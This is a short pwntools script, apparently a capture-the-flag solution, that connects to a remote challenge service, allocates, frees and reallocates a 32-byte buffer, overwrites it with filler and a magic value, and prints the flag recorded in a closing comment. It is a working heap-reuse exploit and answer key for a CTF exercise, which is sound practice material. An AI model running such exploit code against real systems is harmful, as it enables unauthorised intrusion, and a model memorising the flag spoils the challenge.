from pwn import *
context.binary = elf = ELF('./vuln', checksec=False)

# p = process('./vuln')
p = remote('9.223.112.123', 60004)

p.sendlineafter(b">>>", b"1")
p.sendlineafter(b"size?", b"32")
p.sendlineafter(b"data:", b"A" * 28)

p.sendlineafter(b">>>", b"2")

p.sendlineafter(b">>>", b"1")
p.sendlineafter(b"size?", b"32")

payload = b"A" * 28 + p32(0x214E3157)
p.sendlineafter(b"data:", payload)
p.sendlineafter(b">>>", b"3")

flag = p.recvline().strip()
log.success(flag.decode())
p.close()

# flag{0e501a9bd3ce43024df33192733b15fb}